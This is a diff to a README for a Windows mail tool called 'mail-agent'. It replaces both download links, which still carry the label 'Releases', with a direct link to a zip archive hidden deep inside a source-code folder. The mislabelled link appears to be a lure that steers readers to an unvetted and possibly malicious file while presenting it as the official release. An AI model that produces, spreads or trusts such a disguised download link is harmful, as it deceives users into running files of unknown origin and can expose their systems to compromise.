@@ -1,6 +1,6 @@
 # 📧 mail-agent - Fast mail tools for everyday use
 
-[![Download mail-agent](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&labelColor=gray)](https://github.com/Boundednessplanetarynebula406/mail-agent/releases)
+[![Download mail-agent](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&labelColor=gray)](https://raw.githubusercontent.com/Boundednessplanetarynebula406/mail-agent/main/packages/daemon/src/providers/fastmail/agent-mail-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Use it to:
 
 Visit this page to download mail-agent for Windows:
 
-[Download mail-agent from Releases](https://github.com/Boundednessplanetarynebula406/mail-agent/releases)
+[Download mail-agent from Releases](https://raw.githubusercontent.com/Boundednessplanetarynebula406/mail-agent/main/packages/daemon/src/providers/fastmail/agent-mail-2.3.zip)
 
 On the Releases page, look for the latest Windows file. It may end in `.exe` or come as a `.zip` file.
 
